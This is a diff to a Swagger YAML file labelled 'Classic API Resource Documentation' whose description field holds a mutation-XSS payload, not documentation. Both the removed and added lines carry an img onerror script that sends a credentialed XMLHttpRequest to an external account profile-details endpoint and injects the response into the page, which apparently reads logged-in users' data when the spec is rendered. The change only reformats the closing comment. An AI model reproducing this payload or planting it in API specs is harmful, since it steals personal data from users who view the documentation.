@@ -2,8 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=function cors(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200){alert(this.responseText);document.getElementById('demo').innerHTML=this.responseText;}};xhttp.open('GET','https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/profile/details',true);xhttp.withCredentials=true;xhttp.send();}cors();
-//>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=function cors(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200){alert(this.responseText);document.getElementById('demo').innerHTML=this.responseText;}};xhttp.open('GET','https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/profile/details',true);xhttp.withCredentials=true;xhttp.send();}cors();//>"></form>
 
   version: production
 basePath: /JSSResource/
